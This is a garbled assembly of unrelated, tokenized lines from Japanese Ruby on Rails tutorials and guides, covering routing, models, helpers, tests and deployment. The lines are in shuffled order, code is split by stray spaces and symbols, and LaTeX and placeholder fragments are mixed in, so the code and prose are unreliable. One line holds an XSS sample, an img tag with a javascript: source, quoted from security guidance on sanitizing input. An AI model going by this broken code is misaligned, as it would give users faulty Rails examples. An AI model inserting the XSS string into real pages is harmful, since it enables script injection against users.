#   定数 M が 再度 存在 し 、 モジュール オブジェクト " M " を 保持 し て い る が
作成 し た コード を リスト \ ref{ code : password _ reset_test } に 示 し ま す
   Initial  commit
TIP:   エンジン に よ っ て は 、 この ファイル を エンジン の ため の グローバル 設定 オプション と し て 配置 し た い こと も あ る で しょ う 。
FROM   " orders "
特定 の バージョン の Rails インストーラ へ の リンク を 作成 し て もらえ る よう 、 現在 Engine  Yard に 働きかけ て い ま す 。
ミックス イン は \ ref{ sec : u sing _ form _ for } で も 使用 し ま す 。
   validates : name ,  length : {  minimum :   2   }
データベース に サンプル ユーザー を 追加 する Rake タスク 。
実際 は 、 Heroku で 生成 さ れ た デフォルト の アドレス で も 十分 で す 。
###  コメント へ の ルーティング を 追加 する
上記 の コード で 重要 な の は 、 以下 の 行 で す 。
{ 0 } 図 3 ▖ 9 { / 0 }   { 1 } ファイル ナビゲーター に あ る   ( あまり 目立 た な い )   ギア の アイコン { / 1 }
*   Asset   Pipeline の : cache オプション と : concat は 廃止 さ れ ま し た ▟ ビュー から これ ら の オプション を 削除 し て くださ い 。
従 っ て 、 上 の 例 で は `/photos/ 1 ` の よう な パス に は マッチ し な く な り ま す 。
  >>  Rails ▖env ▖ production ?
この とき アクション で 使用 でき る ` params ` は  `{  controller :  'photos' ,   action :  'show ',  id :   ' 1 ' ,  user_ id :   ' 2 '  }` と な り ま す 。
これ ら の 変更 を 加え る こと で Home ページ の テスト は より 簡潔 に な り ま す 。
╼ *= require_ self
#### ` to _options ` と ` to _options !
これ は リスト \ ref{ code : gemrc } で 使用 さ れ て い ま し た 。
Rails は 以下 の よう な ヘルパー も 追加 し て い ま す 。
これ を 行 う に は 、 Rails で \ kode { form\_ for } ヘルパー メソッド を 使用 し ま す ▟ この メソッド は Active   Record オブジェクト を 取り込 み 、 オブジェクト の 属性 を 使用 し て フォーム を 構成 し ま す 。
これ ら の コード に よ り 、 上 から 2 番 目 の マイクロ ポスト を 削除 する と 、 図   \ ref { fig : home_post_ delete } の よう に うま く 動 く はず で す 。
` logout_ path ` を 呼び出 す と `/exit ` が 返 さ れ ま す 。
# => nil
xml ▖ a ( " A   Link " ,   " href "  => " http://rubyonrails ▖org " )
  @ comment  = @ article ▖ comments▖ create( comment_ params )
*  `autobuffer:  true ` は 、 ページ 読み込 み 時 に すぐ 再生 でき る よう に 音声 ファイル を 事前 に 読み込 ん で お き ま す 。
この よう な 些細 な 例 の 場合 は それ ほど 問題 に な り ま せ ん が 、 以下 の よう に エスケープ の 必要 な 文字 が 大量 に あ る 場合 に は 、 シングル クォート は 非常 に 便利 で す 。
また 、 \ kode { has\_ secure\ _ password } を 使 っ て パスワード を ハッシュ 化 する ため に は 、 最 先端 の ハッシュ 関数 で あ る \ href { http://en ▖wikipedia ▖org/wiki/ Bcrypt}{bcrypt } が 必要 に な り ま す 。
新し い バージョン の Rails で は 、 同じ こと を ` t ▖ references  : supplier ` と い う 方法 で 記述 でき ま す ▟ こちら の 方 が 実装 の 詳細 が 抽象 化 さ れ 、 隠蔽 さ れ ま す 。
    "#{ first _ name ▖first }▖ #{ last_ name } "
今 なら 、 この コード を 理解 でき る よう に な っ た はず で す 。
これ で Microposts を 作成 する 準備 が でき ま し た ▟ 作成 方法 は \ ref{ sec :a_user_ tour } と 同じ で す 。
図 \ ref { fig : word _ inheritance_ ruby _ 1 _ 9 } に この クラス 階層 を 示 し ま す 。
これ に よ り 、 新し い バージョン で の ファイル 作成 や 既存 ファイル の 変更 を 対話 形式 で 行な う こと が でき ま す 。
#   Force   all   access  to  the app  over   SSL ,  use   Strict - Transport - Security ,
さらに 、 \ kode {pluralize } と い う 英語 専用 の テキスト ヘルパー が 新た に 登場 し て い ま す 。
\ kode {f ▖object } は \ kode {@user } と な り 、 以下 の コード の 場合 は
記憶 トークン に は ランダム な 文字 列 を 生成 し て 用い る 。
Rails で 事 前 定義 済み の \ kode {session } メソッド を 使用 し て 、 単純 な ログ イン を 行え る よう に し ま す
#  config ▖mock_ with   : flexmock
----------------------------
上 の コード は 以下 の よう に 1 行 で 書け ま す 。
    has_many  : orders ,  -> {  w here   processed :  true   }
module   ActiveRecord
      xml▖title ( @feed_title )
class   Person <  ActiveRecord : : Base
$ bun dle   exec   rake   test ╼ 2   tests ,   2   assertions ,   0   failures ,   0   errors ,   0   skips
### ` acceptance `
この ため 、 ` explain ` は この クエリ を 実際 に 実行 し 、 それ から クエリプラン を 要求 し ま す 。
必要 と な る \ kode {@user } 変数 の 定義 は 、 以下 の リスト \ ref{ code : new_ action_with _user } の よう に な り ま す 。
先ほど 説明 し た 埋め込 み Ruby を レイアウト に 埋め込 ん だ 結果 を 、 リスト \ ref{ code : layout_flash } に 示 し ま す 。
\ href { http://www▖codeschool ▖ com/}{ Code   School } :   プログラミング を 対話 的 に 学習 でき る コース
= >  Application Controller
Rails : : Server ▖ new▖tap  do  |server |
         xml▖title ( item_title ( item) )
例
上 を リソース フル な ルーティング で 記述 する と 以下 の よう に な り ま す 。
上 の 宣言 の まま で は 、 `@customer▖ orders▖ size ` の 値 を 知 る ため に データベース に 対 し て ` COUNT (*) ` クエリ を 実行 する 必要 が あ り ま す 。
   default _scope  {   w here ( " removed_at   IS   NULL " )   }
    X                  # => : in_M
後者 の マイ グレーション ファイル は 、 データベース 構造 を 作成 する ため の もの で あ り 、 この 次 に 説明 し ま す 。
リスト \ ref{ code :hello_ action } の \ kode {hello } アクション を 書き換え 、 「 Hello ,   world ! 」 の 代わり に 「 hola ,  mundo ! 」 と 表示 さ れ る よう に し て み ま しょ う 。
本番 アプリケーション や テスト で 挿入 さ れ る こと は あ り ま せ ん 。
現在 の パスワード 関連 テスト が すべて パス する よう に な り 、 他 の 多く の テスト に も パス する よう に な り ま す 。
                           class:  " nav_bar "  %>
結果 と し て 、 開発 環境 と 本番 環境 と い う 、 2 つ の 異な っ た 状況 に 対 し て それぞれ 最高 の 環境 を 提供 し て くれ ま す 。
#   " M " と い う 名前 の モジュール を 再度 定義 する
I   shall  be   late ! " ▖ truncate_words ( 3 ,  separator :  '!')
作成 し た コード を リスト \ ref{ code : db_seed } に 示 し ま す
私 は 多く の   Rails   関連 の 本 を 参考 に し て き ま し た が 、 真 の 決定 版 と 呼べ る もの は 本書 を お い て 他 に あ り ま せ ん 。
#### hidden_field_tag
セキュリティ 、 それ も Web アプリケーション の セキュリティ は 非常 に 幅広 く 、 かつ 詳細 に 渡 っ て い ま す 。
今度 は 、 \emph { リポジトリ }  ( \emph { repo } と 略 さ れ る こと も あ り ま す )   ごと に 作成 の 必要 な 作業 を 行 い ま す 。
###  ジェネレータ の 設定
 * " THE   BEER - WARE   LICENSE "   ( Revision   42 ) :
` pluralize ` は 、 数値 を 受け取 っ て それ に 応 じ て 英語 の 「 単数 形 / 複数 形 」 活用 を 行 っ て くれ る Rails の ヘルパー メソッド で す 。
Active   Record は 条件 を ハッシュ で 渡 す こと も でき ま す ▟ この 書式 を 使用 する こと で 条件 構文 が 読 み やす く な り ま す 。
use   ActiveRecord : : ConnectionAdapters: : Connection Management
*  `config▖ action _mailer ▖ smtp_settings ` は 、 ` : smtp ` 配信 方法 を 詳細 に 設定 する の に 使用 でき ま す 。
この コード は リスト \ ref{ code :hello_ action } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
他 の エンコード を 使用 し た い 場合 、 事前 に 好み の エンコード を 適用 し た コンテンツ を ` Hash ` で エンコード し て から ` attachments ` に 渡 し ま す 。
   <option   value =" " ></option >
Capybara  DSL を RSpec ヘルパー ファイル に 追加 する 。
<% =  ren der @users  %>
今後 登場 する スタイル 要素 を 利用 でき る よう に する ため に 、 \ kode { home▖html ▖erb } ビュー に 特別 な 要素 を いく つ か 追加 し ま す ( リスト \ ref{ code : signup_button } ) 。
###  プルリクエスト を 発行 する
クラウド ワークス ペース 上 で 実行 し て い る ローカル サーバー を 共有 する 。
Unicode 文字 列 を ルーティング で 直接 使用 する こと も でき ま す 。
いつ も の よう に \ kode {bun dle  install } を 実行 し て 、 Bootstrap を インストール し ま す 。
パスワード 再 設定 の データ モデル も 、 アカウント 有効 化 の 場合 と 似 て い ま す   ( 図 \ ref { fig :user_ model_account_activation } ) 。
Rails は アプリケーション の   ( ` test/dummy ` )  ` app/views ` を 最初 に 検索 し 、 続 い て エンジン の ` app/views ` ディレクトリ を 検索 し ま す 。
{ " development " =>{ " adapter " = > " postgresql " ,   " host " => " local host " ,   " database " = > " my_ database " ,   " pool " = > 5 } }
WARNING:  `MultiJson ▖dump `  と  `MultiJson ▖load ` を それぞれ ` JSON ▖ dump ` と ` JSON ▖load ` に 単純 に 置き換え て は 「 いけ ま せ ん 」 。
Guard は ファイル システム の 変更 を 監視 し 、 たとえば \ kode {static _ pages_spec ▖ rb } ファイル を 変更 する と 自動 的 に テスト を 実行 し ま す 。
ただし この メソッド で は 、 仕様 上 一部 の HTML タグ ( &lt; a &gt ; など ) が 除去 さ れ ま せ ん 。
OS の 違 い 、 バージョン の 違い 、 テキスト エディタ の 設定 の 違 い 、 IDE の 違い など 、 環境 に ばらつき が あ る と 、 さまざま な 問題 が 複合 し て 発生 し て しま い ま す 。
@new_ assemblies = @ part ▖ assemblies ▖w here ( " created_at > ? " ,   2 ▖ days ▖ ago)
\ kode {ren der @users } を 実行 する と 、 自動 的 に \ kode {_user▖html ▖erb } パーシャル を 参照 し 、 各 ユーザー を コレクション と し て 表示 する
マイクロ ポスト 用 の fixture
オブジェクト リレーショナル マッピング   ( O / R マッピング や ORM と 略 さ れ る こと も あ り ま す ) と は 、 アプリケーション が 持 つ リッチ な オブジェクト を リレーショナル データベース ( RDBMS ) の テーブル に 接続 する もの で す 。
    x   =   x   +   1
12345678 90 ▖ to_s(:human_size)      # = >   1 ▖ 15   GB
以上 で テスト スイート は   \ passing   に な る はず で す 。
特に 、 2 つ の 開発 手法 を 比較 する ため に 、 RSpec に よ る 結合 テスト の 組み合わせ を Cucumber で 再 実装 し ま す 。
アセット ディレクトリ
デフォルト で は ` app/assets ` の 検索 が 優先 さ れ る の で 、 対応 する パス が ` lib ` や ` vendor ` に あ る 場合 は マスク さ れ ま す 。
# </ hash>
意味 の あ る サンプル コード を 選 ぶ こと ▟ 概要 と 基本 を 端的 に 示 し 、 かつ 興味 深 い 点 や 落とし穴 も 示 さ れ て い る の が 理想 で す 。
id を 指定 せ ず に すべて の メンバー を 表示 する に は 、 以下 の よう に \ kode {collection } メソッド を 使用 し ま す 。
self を 省略 し た 結果 を リスト \ ref{ code :user_ index_ tests } に 示 し ま す 。
それ で は 、 楽し ん で お 読み くださ い ！
これ を 行 う ため に 、 リスト { p 0 } の { 2 } hidden_field_tag { / 2 } メソッド を 使用 し ま す ▟ この メソッド は   以下 の フォーム の HTML を 生成 し ま す 。
{ 0 } 表 12 ▖ 2 { / 0 }   { 1 } カスタム ルール で 提供 する リスト \ ref{ code : following _ followers_ actions _ routes } の RESTful ルート { / 1 }
* `:status `
Rails が invalid   mass   assignment エラー を 発生 する よう に する 設定 。
記憶 トークン や それ と 対応 する 記憶 ダイジェスト を ユーザー ごと に 関連 付け て 、 永続 的 セッション で 使用 でき ま す 。
#  rspec - rails ▖
次 の 第 \ ref { cha : rails_flavored _ruby } 章 で は 少し 回り道 を し 、 Rails を 支え て い る Ruby と い う 言語 に つ い て 簡単 に 学 び ま す 。
( CSS ファイル 名 の 後 に 、 \ kode {? body = 1 } の よう な 行 が 余分 に 表示 さ れ て い る こと が あ り ま す 。
この 場合 、 以下 の メソッド 呼び出し の 結果 を テスト する こと が でき ま す 。
これ で 4 つ が 順 に 実行 さ れ ま す 。
rmdir  < ディレクトリ 名 >
さらに 、 サイド バー に は 小さめ の ユーザー プロフィール 画像 の リンク を 格子 状 に 並べ て 表示 する 予定 で す 。
セキュア な 通信 と 高 い パフォーマンス を 確保 する ため に 、 本番 環境 で は SSL と Puma を 導入 し た
1 ▖ month ▖ from _now
###  アセット と プリ コンパイル を 分離 する
\ ref{ sec : prerequisites } で も 詳し く 解説 し て い る とおり 、 Web 開発 は まったく の 初心 者 が ちょっと 頑張 っ た だけ で 簡単 に 学べ る よう な もの で は あ り ま せ ん 。
###  親
最後 に 、 セキュリティ の 常道 と し て 、 パスワード の 長 さ 検証 を テスト し ま す ▟ 以下 の コード で は 、 パスワード は 6 文字 以上 で あ る こと を 要求 し ま す 。
` ENV [ ' DATABASE _ URL '] ` の 情報 より も database▖yml の 情報 を 優先 する 唯一 の 方法 は 、 database▖yml で ` " url" ` サブ キー を 使用 し て 明示 的 に URL 接続 を 指定 する こと で す 。
詳細 に つ い て は 以下 を 参照 し て くださ い 。
def  authenticate( controller , & login_procedure )
def  rewrite_ path (options )
╼\end{ code }╼╼    %  subsection   hashes_and_symbols   ( end ) ╼╼    \ subsection { CSS   revisited} %  ( fold) ╼    \ label{ sec : css_revisited}╼╼
GitHub の Issue に は 「 機能 リクエスト 」 を 記入 し な い で くださ い 。
###  メール 送信 時 に 配信 オプション を 動的 に 変更 する
SELECT  *  FROM   clients  LIMIT   5
" 2010 - 0 7 - 27   23 : 42 : 0 0 " ▖ to_time(:local )  # =>  Tue   Jul  27   23 : 42 : 0 0   + 0200   2010
* ` ActionDispatch : : Callbacks▖ after ` に は 、 リクエスト の 後 に 実行 し た い コード ブロック を 1 つ 引数 と し て 与え ま す 。
上 の SQL を 日本 語 で 書 く と 、 「 カテゴリー が 1 つ あ り 、 かつ コメント が 1 つ 以上 あ る 、 すべて の 記事 を 返 す 」 と な り ま す 。
$  bin/rails   generate  model   Comment  article _ id : integer  text : text
  ( この マジック カラム の 使用 例 を \ ref{ sec : creating _user_objects } から 具体 的 に 見 て い き ま す ) 。
この コード の 戻 り 値 は 、 \ kode { params } ハッシュ の バージョン と 、 許可 さ れ た 属性 で す   ( \kode { :user } 属性 が な い 場合 は エラー に な り ま す ) 。
ワン ライナー に 収ま る 条件 を 使用 し た い 場合 に 最適 で す 。
 # =>  [ " 以下 の 文字 を 含 む こと は でき ま せ ん   !
CREATE   TABLE   products  (
  <div  id = " error _explanation " >
上 の 例 で は 、 マクロ に よ っ て ` size ` の 代わり に ` avatar _ size ` が 生成 さ れ ま す 。
* `_product ▖html ▖erb `
JRuby 環境 で My SQL を 採用 する 場合 、 ` config/ database▖yml ` の 記述 方法 は 少し 異な り ま す 。
ある クラス で 属性 を 定義 する と 、 後 に その クラス の サブ クラス が 作成 さ れ る とき に 名前 が 衝突 する リスク が 生 じ ま す 。
### `errors▖ size`
class   Create AssembliesAndParts <  ActiveRecord : : Migration
この 節 は 、 データ モデリング の スキル を 向上 さ せ る と い う 強 い 要請 に 基 い て 書 か れ ま し た ▟ 時間 を かけ て 身 に 付け て いただけ れ ば 幸い で す 。
[ remember   me ]   チェック ボックス の CSS
特定 の フィールド だけ を 取り出 す
\ kode {user_ id } 属性 と 同様 に 、 \ kode {content } 属性 も 存在 する 必要 が あ り 、 さらに \emph { マイクロ } ポスト が 140 文字 より 長 く な ら な い よう 制限 を 加え ま す 。
# => #< Client   id :   1 ,   first _ name :  " Lifo " >
つまり 、 ` Time▖now ` が ` Time▖ currentyesterday ` と 等し く な る こと が あ り え る と い う こと で す 。
|   DELETE     | / comments/: id ( ▖: format )                 |  comments# destroy  | sekret_comment_ path      |
self を 省略 し た 結果 を リスト \ ref{ code : password _ reset_form } に 示 し ま す 。
デバッグ モード が 既に オン の 場合 、 ` : debug ` オプション は 冗長 で す 。
リスト \ ref{ code : development_email_settings } の ホスト 名 「 \ kode {’ example ▖ com’} 」 の 部分 は 各自 の development 環境 に 合わせ て 変更 し て くださ い 。
Micropost モデル は 、 マイクロ ポスト の 内容 を 保存 する \ kode {content } 属性 と 、 特定 の ユーザー と マイクロ ポスト を 関連 付け る \ kode {user \ _ id } 属性 の 2 つ の 属性 だけ を 持 ち ま す 。
仮 に 、 あなた が 重要 な \ kode {app/controllers/} ディレクトリ を 削除 し て しま っ た と し ま しょ う 。
既存 の レコード を 更新 し た い とき に は 新た に ` update ` アクション を 使用 し ま す ▟ この アクション に は 、 更新 後 の 属性 を 含 む ハッシュ を 渡 す こと が でき ま す 。
Windows ユーザー の 方 は \ href { http://railsinstaller ▖org / }{ Rails インストーラ } から インストーラ を ダウンロード し て くださ い 。
コントローラ や scaffold を デフォルト の gem セット で 生成 し た 場合 、 通常 Java Script ファイル や CSS ファイル が 置 か れ る 場所 に Coffee Script ファイル と SCSS ファイル が それぞれ 生成 さ れ ま す 。
特に 、 \ kode { Rails ▖env▖ development ? } が \ kode {true } に な る の は 開発 環境 に 限 ら れ る ため 、 以下 の 埋め込 み Ruby
` app/controllers/articles_controller▖ rb ` を エディタ で 開 き 、 ` create ` アクション を 次 の よう に 変更 し ま す 。
パスワード 再 設定 の \ kode {edit } アクション
### `select_all`
#   以前 の ミューテーター 呼び出 し 方法
####  ネスト し た 関連 付け を 結合 する   ( 複数 レベル )
アリス は サンプル アプリケーション に ユーザー 登録 し ま す ▟ メール アドレス は alice@ wonderland ▖ com で す 。
ユーザー 登録 フォーム が 無事 に 動 い た ら 成功 で す ▟ 成功 する と 図 \ ref { fig : signup_ in_production } の よう に な り ま す 。
Git を 使 っ て い る 方 は 、 この 時点 で master ブランチ に 変更 を マージ し て くださ い 。
以下 の コード を 見 て み ま しょ う 。
   belongs_to  : order
< /tr>
テスト の うち 、 1 つ は 失敗 する はず で す 。
#  config/ environments/test ▖ rb
この URL に 対応 する ルーティング ヘルパー は ` publisher_ magazine _photo _url` と な り ま す ▟ この ヘルパー を 使用 する に は 毎回 3 つ の 階層 すべて で オブジェクト を 指定 する 必要 が あ り ま す 。
同じ コード を 繰り返 し 書 く こと を 徹底 的 に 避け る こと で 、 コード が 保守 し やす く な り 、 容易 に 拡張 でき る よう に な り 、 そして 何 より バグ を 減ら す こと が でき ま す 。
HTML の 色 は 、 16 進 数   ( 基数 が 16 )   の 3 つ の 数値 の 組み合わせ で 表現 さ れ 、 赤 、 緑 、 青 の 三 原色 に   ( この 順序 で )   コード 化 する こと が でき ま す 。
上 の ルール は 、 Sass を 使用 し て 以下 の よう に 書き換え る こと が でき ま す 。
ローカル 環境 で コンパイル する 方法 に つ い て は 次 の セクション を 参照 し て くださ い 。
NoMethodError :  undefined   method   ` reverse '  for   : foobar: Symbol
*   シンボル
      #  何 か 気 の 利 い た 変更 を 行な う
ここ で 、 第 \ ref { cha :a_toy_ app } 章 の Users コントローラ や Microposts コントローラ と は 異な り 、 StaticPages コントローラ は 一般 的 な REST アクション に 対応 し て い な い こと に 注意 し て くださ い 。
Rails   4 ▖ 1 で は JSON の 扱い が 大き く 変更 さ れ た 点 が 4 つ あ り ま す 。
上 の 例 で わか る よう に 、 ` default _scope ` が `scope ` と ` w here ` より も 前 の 場所 に マージ さ れ て い ま す 。
       exist    config
#####  条件 付き レイアウト
####  ネスティング 回数 の 限界
` beginning _ of_minute ` は 、 その 分 の 最初 の 時点   ( hh: mm : 0 0 )   の タイム スタンプ を 返 し ま す 。
*   コントローラ レベル の バリデーション は 一 度 は や っ て み た く な る もの で す が 、 たいてい 手 に 負え な く な り 、 テスト も 保守 も 困難 に な り がち で す 。
Ruby   on   Rails で は [ GitHub の Issue トラッキング ] (https://github▖ com/rails/rails/issues ) 機能 を 使用 し て issue を トラッキング し て い ま す ▟ 主に バグ や 、 新し い コード の 貢献 に 使用 さ れ ま す 。
次 の ` : formats ` キー は 、 応答 時 に 返 さ れ る テンプレート の フォーマット を 示 し ま す 。
有力 な 候補 と し て 様々 な もの が 考え られ ま す が 、 基本 的 に は 長 く て ランダム な 文字 列 で あ れ ば どんな もの で も 構 い ま せ ん 。
上 で 述べ た よう に 、 \ kode { git  branch   - D } で トピック ブランチ 上 の 変更 を 破棄 する こと も でき ま す 。
    ren der  plain:   params [ : article ] ▖ inspect
require   'active_ support/core _ext/object'
これ を 使用 し て 、 にせ の リダイレクト 、 XSS 、 HTTP レスポンス 分割 攻撃 が 行 わ れ る 可能 性 が あ り ま す 。
SQLite は 開発 用 ・ テスト 用 で あ れ ば 問題 な く 使用 でき ま す が 、 本番 で の 使用 に は 耐え られ な い 可能 性 が あ り ま す 。
WARNING:  `parent_ name ` は 上 の 場合 で も ` nil ` を 返 し ま す 。
end _of _week  ( at_end _of _week )
                                    customer_ name :  " John   Doe " )
#   # => < label  for = " article_title " > A  short title< / label>
` Range ` の 拡張
“ Home”   や  “ About ”   の よう な 定番 の 静的 な ページ が な い
orphan ▖ reachable ?  
=> " The  Dude "
デフォルト の スコープ は 、 条件 を 連鎖 し た 場合 に オーバーライド さ れ な く な り ま し た 。
Bitbucket の リポジトリ ページ 。
*  `config▖i 18n ▖ default _ locale ` は 、 アプリケーション の i 18 n で 使用 する デフォルト の ロケール を 設定 し ま す 。
#   Rails 定数 を 委譲 する
  リスト \ ref{ code : has_many _ following_ through _active_relationships } で 定義 し た 関連 付け に よ り 、 フォロー し て い る ユーザー を 配列 の 様 に 扱え る よう に な り ま し た 。
( 詳細 は 第 \ ref { cha : modeling _ users } 章 で 説明 し ま す が 、 この ユーザー 情報 は 、 Web アプリケーション の 背後 に あ る データベース に 保存 さ れ て い ま す ▟ )
#   You  can   have   the   root   of  your   site   routed  with   " root "
###   その 他 の セキュリティ 対策
サンプル アプリケーション に 動的 な ページ を 追加 する 準備 と し て 、 ここ で Web サイト の レイアウト に デバッグ 情報 を 追加 し ま しょ う   ( リスト \ ref{ code :rails_debug } ) 。
### ` exclusion `
    <%=  ren der   partial :   " product " ,   collection : @products %>
この メソッド を 使用 し て 修正 し た バージョン を 以下 に 示 し ま す 。
      @ current_user ▖ special ?  ?  
<% @ articles ▖each   do  | article | %>
` getutc ` は この メソッド の 別名 で す 。
手順 と し て は 、 まず は 開発 環境 用 の β 版 を 実装 し 、 その 後 、 いく つ か の 改善 を とお し て 本番 環境 用 の 完成 版 を 実装 し ま す 。
次 に master ブランチ に 移動 し 、 \ ref{ sec : git_ commands }{ p 2 } と 同じ 要領 で 差分 を マージ し ま す 。
この 章 で は インストール 、 開発 環境 の 設定 、 バージョン 管理 、 本番 環境 へ の デプロイ など 、 多く の 課題 を 達成 し ま し た 。
###   命名 ルール
#### options _ from_collection_for_select
#### atom_feed
もう 1 つ は \ kode {any ? } メソッド で す ▟ これ は \ kode {empty ? } メソッド と 互い に 補完 し ま す 。
リスト \ ref{ code :hello_ root _ route } で 以下 の 変更 を 行 っ た こと を 思い出 し て くださ い 。
これ ら の 計算 は 、 内部 で ` since ` メソッド や ` advance ` メソッド に 置き換え られ ま す 。
*   Ajax の 基礎
これ で \ href { http://local host : 3000 / }{http://local host : 3000 / } で デモ アプリケーション を ブラウザ 表示 でき る よう に な っ て い る はず で す 。
*   `update !
yield(:news_content )  : yield %>
###  ミドルウェア を 設定 する
Math▖qualified_const _ get ( " E " )  # = >   2 ▖ 718 2818 2 8459 04 5
` test ` ディレクトリ は 、 エンジン が テスト を 行な う ため の 場所 で す 。
上 に よ っ て 以下 が 生成 さ れ ま す 。
Web 経由 で ユーザー を 作成 する 機能 を これ から 追加 し ま す の で 、 \ ref{ sec : creating _a_user } で 作成 し た ユーザー を ここ で 削除 し て お き ま しょ う 。
上 で は 、 文字 列 を 配列 に 変換 する の に \ kode {split } を 使用 し ま し た 。
self を 省略 し た 結果 を リスト \ ref{ code :edit_tests_ signed_ in } に 示 し ま す 。
ダミー の Rails アプリ で 変更 を テスト する 必要 が あ る 場合 は 、 ` rails   new` に `-- dev` フラグ を 追加 する と 、 ローカル ブランチ を 使用 する アプリケーション が 生成 さ れ ま す 。
この コントローラ の クラス は 、 以下 の よう に ` Blorgh ` モジュール 内 で 定義 さ れ ま す 。
Article▖ includes(:comments) ▖ w here ( comments: {  visible:  true   } )
ユーザ の マイクロ ポスト の 場合 に は 、 こう な り ま す 。
これ ら の オプション は 、 単一 の メソッド 名 また は メソッド 名 の 配列 を 引数 と し て 受け取 り ま す ▟ 渡 す メソッド 名 は コントローラ 内 の メソッド 名 に 対応 し ま す 。
end {enumerate}╼╼    %  subsection  a_class _of _our_own  ( end ) ╼╼    \ subsection { 組込 み クラス の 変更 }  %  ( fold) ╼    \ label{ sec : modifying _built_ in_classes}╼╼
静的 な ページ の 作成 は 、 第 \ ref { cha :a_toy_ app } 章 で scaffold 生成 に 使用 し た   \ kode { generate}   スクリプト で 、 コントローラ を 生成 する こと から 始め ま す 。
なお 、 Heroku に 展開 する とき に エラー が 発生 し た 場合 は 、 以下 の コマンド を 実行 し て 本番 環境 の ログ を 取得 し て くださ い ▟ この ログ は 、 問題 を 特定 する とき に 役立 ち ま す 。
各 ビュー を 更新 し た 結果 を 、 リスト \ ref{ code : signup_errors_updated } 、 リスト \ ref{ code : password _ reset_updated } 、 リスト \ ref{ code :edit_errors_updated } に 示 し ま す 。
  #  上 の コード は 以下 の よう に 変更 する 必要 が あ る
次 の 問題 は 、 ワーム の 作者 が CSRF セキュリティ トークン を 利用 し て い た こと で し た 。
   queue _as  : default
HTML 構造 を 削除 し た Help ページ   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ hash/except▖rb ` で す 。
`<%= ` タグ を 使用 し て `@ article ▖ author ` を 出力 する と 、 ` to_s ` メソッド が この オブジェクト に 対 し て 呼び出 さ れ ま す 。
\ kode {pluralize } を 使用 する こと で 、 コード は 以下 の よう に な り ま す 。
   i▖ name  =  ' Jones '
   body     i 18n ▖t  : body ,   user_ name :  user▖ name
変更 の 結果 、 レイアウト ファイル は { 0 } { 1 } リスト 3 ▖ 32 { / 1 } { / 0 } の よう に な り ま す 。
これ は リスト \ ref{ code :_ close _browser } で 使用 さ れ て い ま し た 。
` : host ` に 指定 する 値 は その アプリケーション 内 で 共通 で あ る の が 普通 な の で 、 ` config/application ▖rb ` に 以下 の 記述 を 追加 し て グローバル に 利用 でき る よう に し ま す 。
必要 で あ れ ば 複数 行 に わた っ て エントリ を 記入 し たり 、 スペース 4 つ の インデント を 置 い た コード 例 を 記入 し たり する こと も でき ま す 。
|   GET        | /photos/:id       |  photos# show        | image_ path(:id )       |
一方 で 、 User モデル に 対 する 簡単 な In this   case ,  it’s  easy  to   write   a   short  test   for   the  User   model ,   in  which   we use   \ kode { following ? }
この キャッシュ は スレッド セーフ で は な く 、 単一 スレッド 用 の 一時 メモリ キャッシュ と し て 機能 する こと のみ を 意図 し て い る こと に ご 注意 くださ い 。
      errors▖ add(:discount ,   " 合計 額 を 上回 る こと は でき ま せ ん " )
</html >
` Class ` の 拡張
concern は ルーティング 内 の どの よう な 場所 に で も 配置 する こと が でき ま す ▟ スコープ や 名前 空間 呼び出し で の 使用 法 は 以下 の とおり で す 。
設定 の 落とし穴
ブロック で 使用 可能 な メソッド の 完全 な リスト は 以下 の とおり で す 。
self を 省略 し た 結果 を リスト \ ref{ code :bootstrap_js } に 示 し ま す 。
<ul >< li >`: location` - sendmail の 実行 可能 ファイル の 場所 を 指定 する 。
この メッセージ を 表示 し た く な い の で あ れ ば 、 \ href { http://lmgtfy▖ com/?q = invalid + multibyte + character } { エラー メッセージ を ググ って } 対応 し て くださ い 。
< img   src= javascript: alert ( ' Hello ') >
それぞれ の アクション は 、 情報 を 集め て ビュー に 送り出 す の が 役割 で す 。
*  `active_ support▖initialize_time_zone `: `config▖time_zone ` の 設定 に 基 い て アプリケーション の デフォルト タイム ゾーン を 設定 し ま す ▟ デフォルト 値 は " UTC " で す 。
       exist       app/views/users
Turbolinks
( 念 の ため 、 \ href { http://help▖ github▖ com/key- setup - redirect } { GitHub の SSH キー 作成 方法 の チュートリアル } を 先 に 読 ん で お い て くださ い ) 。
フォロー し て い る ユーザー 用 ページ の モックアップ
いったい 何 が 問題 な の で しょ う か 。
class   Representative   <  ActiveRecord : : Base
** ` ActionDispatch : : Flash` **
Rails チーム が 特定 の API を どの よう に 扱 っ て い る か を 知 り た い 場合 は 、 お 気軽 に チケット を 発行 し て [ issue   tracker ] (https://github▖ com/rails/rails/issues ) に パッチ を 送 っ て くださ い 。
ユーザー 情報 を 表示 する ため の 仮 の ビュー
╼ *= require_tree   ▖
アップグレード 後 に アプリケーション が 正常 に 動作 し て い る こと を 確認 する 方法 と し て は 、 良 い テスト カバレッジ を アップグレード 前 に 準備 し て お く の が 最善 で す 。
@ open _order   = @open _orders▖ first   #  ここ で 初めて データベース へ の クエリ が 行 わ れ る
User ▖ all ▖each   do  |user |
完全 な アプリケーション コード を リスト \ ref{ code :settings_link } に 示 し ま す 。
####  リダイレクト の ステータス コード を 変更 する
アカウント 有効 化   ( \ ref{ sec : account_activations _ resource } )   の 場合 と 同様 、 最初 に 新し い リソース で 使用 する コントローラ を 生成 し ま す 。
get  '/ patients/: id ' , to :  ' patients # show ',  as :  ' patient'
12345 67 ▖ to_s(:human )            # =>  " 1 ▖ 23   Million "
#   この ファイル を 変更 後 サーバー を 必ず 再 起動 し て くださ い 。
\ kode {pluralize } の 最初 の 引数 に 整数 が 与え られ る と 、 それ に 基づ い て 2 番 目 の 引数 の 英 単語 を 複数 形 に 変更 し た もの を 返 し ま す 。
これ は 以下 の よう に 実装 でき ま す 。
この sqlite 3 と い う gem の バージョン を 指定 する 主な 方法 は 2 とおり あ り ま す ▟ これ に よ り 、 Rails で 使用 さ れ る gem の バージョン を 「 ある 程度 」 制御 でき ま す 。
{ 0 } 図 11 ▖ 7 { / 0 }   { 1 } ユーザー プロフィール   ( \ href { http://local host : 3000 / users / 1 }{ / users / 1 } )   と マイクロ ポスト { / 1 }
リダイレクト 先 が 正し い か どう か を チェック し ま す 。
アプリケーション に この エンジン を 後 から インク ルード する に は 、 ` Gemfile ` に 以下 の 行 を 追加 し ま す 。
     following
